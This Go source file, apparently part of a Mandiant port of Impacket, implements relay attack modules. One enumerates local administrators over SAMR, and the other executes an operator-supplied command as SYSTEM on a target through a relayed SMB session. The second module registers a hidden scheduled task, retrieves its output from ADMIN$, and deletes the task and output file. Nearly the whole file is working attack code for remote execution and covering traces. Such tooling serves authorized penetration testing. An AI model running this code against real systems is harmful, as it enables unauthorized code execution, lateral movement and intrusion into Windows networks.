// Copyright 2026 Google LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     https://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package relay

import (
	"fmt"
	"log"
	"strings"
	"time"

	"github.com/mandiant/gopacket/internal/build"
	"github.com/mandiant/gopacket/pkg/dcerpc"
	"github.com/mandiant/gopacket/pkg/dcerpc/samr"
	"github.com/mandiant/gopacket/pkg/dcerpc/tsch"
)

// EnumLocalAdminsAttack enumerates local administrators via SAMR.
// This matches Impacket's --enum-local-admins fallback when relay auth succeeds but user is not admin.
type EnumLocalAdminsAttack struct{}

func (a *EnumLocalAdminsAttack) Name() string { return "enumlocaladmins" }

func (a *EnumLocalAdminsAttack) Run(session interface{}, config *Config) error {
	client, ok := session.(*SMBRelayClient)
	if !ok {
		return fmt.Errorf("enum-local-admins requires SMB session")
	}
	return enumLocalAdmins(client, config)
}

// enumLocalAdmins connects to SAMR via relay pipe and lists members of BUILTIN\Administrators (RID 544).
func enumLocalAdmins(client *SMBRelayClient, cfg *Config) error {
	targetHost := cfg.TargetAddr
	if t := cfg.GetTarget(); t != nil {
		targetHost = t.Host
	}

	log.Printf("[*] Enumerating local admins on %s via SAMR...", targetHost)

	// Connect to IPC$ and open samr pipe
	if err := client.TreeConnect("IPC$"); err != nil {
		return fmt.Errorf("tree connect IPC$: %v", err)
	}

	fileID, err := client.CreatePipe("samr")
	if err != nil {
		return fmt.Errorf("open samr pipe: %v", err)
	}
	defer client.ClosePipe(fileID)

	// Create DCERPC client over relay pipe
	transport := NewRelayPipeTransport(client, fileID)
	rpcClient := &dcerpc.Client{
		Transport: transport,
		CallID:    1,
		MaxFrag:   dcerpc.GetWindowsMaxFrag(),
		Contexts:  make(map[[16]byte]uint16),
	}

	// Bind to SAMR
	if err := rpcClient.Bind(samr.UUID, samr.MajorVersion, samr.MinorVersion); err != nil {
		return fmt.Errorf("bind samr: %v", err)
	}

	if build.Debug {
		log.Printf("[D] EnumLocalAdmins: bound to SAMR interface")
	}

	// Create SAMR client (no session key needed for read-only ops via relay pipe)
	samrClient := samr.NewSamrClient(rpcClient, nil)

	// Connect to SAM
	if err := samrClient.Connect(); err != nil {
		return fmt.Errorf("SAMR connect: %v", err)
	}
	defer samrClient.Close()

	// Open BUILTIN domain
	builtinHandle, _, err := samrClient.OpenBuiltinDomain()
	if err != nil {
		return fmt.Errorf("open BUILTIN domain: %v", err)
	}

	// Open Administrators alias (RID 544)
	aliasHandle, err := samrClient.OpenAlias(builtinHandle, 544)
	if err != nil {
		return fmt.Errorf("open Administrators alias: %v", err)
	}

	// Get members
	memberSIDs, err := samrClient.GetMembersInAlias(aliasHandle)
	if err != nil {
		return fmt.Errorf("get alias members: %v", err)
	}
	samrClient.CloseHandle(aliasHandle)
	samrClient.CloseHandle(builtinHandle)

	if len(memberSIDs) == 0 {
		log.Printf("[*] No members found in local Administrators group")
		return nil
	}

	log.Printf("[+] Local admin members on %s (%d):", targetHost, len(memberSIDs))
	for _, sid := range memberSIDs {
		if sid == nil {
			continue
		}
		sidStr := samr.FormatSID(sid)
		log.Printf("    %s", sidStr)
	}

	return nil
}

// TschExecAttack executes a command via the Task Scheduler service (ATSVC/SchRpc).
// This matches Impacket's rpcattack.py TSCH mode.
type TschExecAttack struct{}

func (a *TschExecAttack) Name() string { return "tschexec" }

func (a *TschExecAttack) Run(session interface{}, config *Config) error {
	client, ok := session.(*SMBRelayClient)
	if !ok {
		return fmt.Errorf("tschexec attack requires SMB session")
	}
	return tschExecAttack(client, config)
}

// tschExecAttack creates a scheduled task to execute a command, runs it, and cleans up.
// Matches Impacket's TSCHRPCAttack._run() flow.
func tschExecAttack(client *SMBRelayClient, cfg *Config) (err error) {
	if cfg.Command == "" {
		return fmt.Errorf("no command specified (-c flag)")
	}

	// Buffered run log: flushed on exit once the session is established, so
	// post-auth failures leave a traceable file and auth/session failures do not.
	host := hostFromAddr(client.TargetAddr)
	rl := &runLog{}
	defer func() { rl.Flush(cfg, host, "tschexec", cfg.Command, err) }()

	// Connect to IPC$ and open atsvc pipe (ITaskSchedulerService)
	if err := client.TreeConnect("IPC$"); err != nil {
		return fmt.Errorf("tree connect IPC$: %v", err)
	}

	fileID, err := client.CreatePipe("atsvc")
	if err != nil {
		return fmt.Errorf("open atsvc pipe: %v", err)
	}
	defer client.ClosePipe(fileID)

	// Create DCERPC client over relay pipe
	transport := NewRelayPipeTransport(client, fileID)
	rpcClient := &dcerpc.Client{
		Transport: transport,
		CallID:    1,
		MaxFrag:   dcerpc.GetWindowsMaxFrag(),
		Contexts:  make(map[[16]byte]uint16),
	}

	// Bind to ITaskSchedulerService
	if err := rpcClient.Bind(tsch.UUID, tsch.MajorVersion, tsch.MinorVersion); err != nil {
		return fmt.Errorf("bind tsch: %v", err)
	}

	if build.Debug {
		log.Printf("[D] TschExec: bound to ITaskSchedulerService")
	}

	ts := tsch.NewTaskScheduler(rpcClient)

	// Random names (no tool-identifying prefix). The task writes its output to a
	// target temp file terminated by a completion marker; finding the marker on
	// read-back proves the command ran to completion (Impacket-style verify).
	outFile := randomName() + ".tmp"
	remoteOut := "Temp\\" + outFile // relative to ADMIN$ (= %SystemRoot%)

	rl.Printf("[*] Executing command via Task Scheduler on %s...", host)

	// Generate random task name
	taskName := "\\" + randomName()

	// Build task XML (matches Impacket's XML template)
	// Runs as SYSTEM with HighestAvailable run level
	taskXML := buildTaskXML(fmt.Sprintf("%s > %%SystemRoot%%\\%s 2>&1 & echo %s >> %%SystemRoot%%\\%s",
		cfg.Command, remoteOut, cmdDoneMarker, remoteOut))

	if build.Debug {
		rl.Printf("[D] TschExec: registering task %s", taskName)
	}

	// Register task
	actualPath, err := ts.RegisterTask(taskName, taskXML, tsch.TASK_CREATE)
	if err != nil {
		return fmt.Errorf("register task: %v", err)
	}

	rl.Printf("[*] Task %s registered successfully", actualPath)

	// Run task
	if err := ts.Run(actualPath); err != nil {
		rl.Printf("[-] Task run returned: %v", err)
	} else {
		rl.Printf("[*] Task executed")
	}

	// Poll for the output file until the completion marker appears (the file is
	// created at command start, so existence alone does not mean it finished).
	wait := cfg.CmdTimeout
	if wait <= 0 {
		wait = 10 * time.Second
	}
	deadline := time.Now().Add(wait)
	var output []byte
	found := false
	for time.Now().Before(deadline) {
		time.Sleep(500 * time.Millisecond)
		data, derr := client.DownloadFile("ADMIN$", remoteOut)
		if derr != nil {
			continue
		}
		if strings.Contains(string(data), cmdDoneMarker) {
			output = data
			found = true
			break
		}
	}

	// Delete task (retried — the relay session can be flaky after the task runs)
	var delErr error
	for attempt := 0; attempt < 3; attempt++ {
		if delErr = ts.Delete(actualPath); delErr == nil {
			break
		}
		time.Sleep(500 * time.Millisecond)
	}
	if delErr != nil {
		rl.Printf("[-] Warning: failed to delete task %s after retries: %v", actualPath, delErr)
	} else {
		rl.Printf("[*] Task %s deleted", actualPath)
	}

	// Always best-effort remove the temp output file, success or not.
	if derr := client.DeleteFile("ADMIN$", remoteOut); derr != nil {
		if found {
			rl.Printf("[-] Warning: could not delete %s on target: %v", remoteOut, derr)
		} else {
			verboseLog("[-] Best-effort delete of %s failed: %v", remoteOut, derr)
		}
	}

	if !found {
		rl.Printf("[-] No completed output from target (%s) — command did not execute (no file or missing %s marker)", remoteOut, cmdDoneMarker)
		return fmt.Errorf("command did not execute on %s (no completion marker in %s)", cfg.TargetAddr, remoteOut)
	}

	text := strings.TrimSpace(strings.ReplaceAll(string(output), cmdDoneMarker, ""))
	if text != "" {
		rl.Printf("[+] Command output:\n%s", text)
	} else {
		rl.Printf("[*] Command executed (no output)")
	}

	return nil
}

// buildTaskXML creates the XML task definition matching Impacket's template.
// The task runs as SYSTEM with highest available privileges.
func buildTaskXML(command string) string {
	// Split command into executable and arguments if needed
	// Impacket wraps everything in cmd.exe /C
	cmd := fmt.Sprintf("cmd.exe /C %s", command)

	// Escape XML special characters in command
	cmd = strings.ReplaceAll(cmd, "&", "&amp;")
	cmd = strings.ReplaceAll(cmd, "<", "&lt;")
	cmd = strings.ReplaceAll(cmd, ">", "&gt;")
	cmd = strings.ReplaceAll(cmd, "\"", "&quot;")

	return fmt.Sprintf(`<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>2015-07-15T20:35:37.2940000</Date>
    <Author>S-1-5-18</Author>
    <Description></Description>
  </RegistrationInfo>
  <Triggers>
    <CalendarTrigger>
      <StartBoundary>2015-07-15T20:35:13.2757294</StartBoundary>
      <Enabled>true</Enabled>
      <ScheduleByDay>
        <DaysInterval>1</DaysInterval>
      </ScheduleByDay>
    </CalendarTrigger>
  </Triggers>
  <Principals>
    <Principal id="LocalSystem">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>P3D</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="LocalSystem">
    <Exec>
      <Command>%s</Command>
    </Exec>
  </Actions>
</Task>`, cmd)
}
